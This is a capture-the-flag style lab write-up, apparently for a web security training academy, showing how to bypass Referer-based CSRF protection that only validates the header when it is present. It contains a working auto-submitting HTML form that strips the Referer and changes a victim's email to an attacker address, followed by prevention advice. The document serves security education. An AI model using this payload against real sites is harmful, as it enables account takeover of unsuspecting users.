# Lab: CSRF where Referer validation depends on header being present

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF)

## 🎯 Objective
Bypass weak Referer-based CSRF protection.

## 📖 Description
The application tries to prevent CSRF by checking the `Referer` header. However, it only validates the header **if it is present**. If the `Referer` header is missing entirely, the request is accepted.

## 🔍 Vulnerability Analysis

- **Defense**: Referer header validation.
- **Weakness**: Missing `Referer` header = request accepted (incomplete check).
- **Bypass Technique**: Send the request without a `Referer` header.

## 🛠️ How to Solve (Step by Step)

1. Capture a normal email change request and observe the Referer check.
2. Test removing the `Referer` header in Burp Repeater — the request succeeds.
3. Create an exploit that suppresses the Referer header.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - No Referer</title>
    <!-- Suppress Referer -->
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery
Upload to Exploit Server → Deliver to victim.
⚡ Impact
Simple header stripping bypasses the protection.
🛡️ Prevention

If using Referer validation:
Reject requests where Referer is missing.
Validate that the Referer matches the expected domain.

Better: Use CSRF tokens as the main defense.

🔬 Key Learning Points

Header-based defenses must handle the case when the header is absent.
no-referrer meta tag or browser policies can strip the Referer.
Referer validation is fragile and should be a secondary defense only.
